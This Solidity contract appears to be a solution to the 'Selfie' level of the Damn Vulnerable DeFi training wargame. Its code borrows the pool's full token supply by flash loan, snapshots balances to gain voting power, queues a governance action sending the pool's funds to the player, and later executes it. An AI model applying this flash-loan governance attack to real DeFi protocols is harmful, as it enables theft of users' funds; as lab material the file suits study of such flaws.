// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Governor {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    address _player;
    DamnValuableTokenSnapshot _underlying;
    SimpleGovernance _governance;
    SelfiePool _pool;
    uint256 _id;

    constructor(address token, address governance, address pool) {
        _player = msg.sender;
        _underlying = DamnValuableTokenSnapshot(token);
        _governance = SimpleGovernance(governance);
        _pool = SelfiePool(pool);
        _id = 0;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32) {
        // a decent contract would check the args here

        // take a snapshot of the underlying balances
        _underlying.snapshot();

        // queue the emergencyExit action
        bytes memory _payload = abi.encodeWithSignature("emergencyExit(address)", _player);
        _id = _governance.queueAction(address(_pool), 0, _payload);

        // payback the loan
        _underlying.approve(msg.sender, amount);

        // protocol
        return CALLBACK_SUCCESS;
    }

    function getVotes() public {
        // borrow the maximum
        uint256 _amount = _pool.maxFlashLoan(address(_underlying));
        _pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_underlying), _amount, "");
    }

    function getFunds() public {
        // execute the emergency exit action
        _governance.executeAction(_id);
    }
}
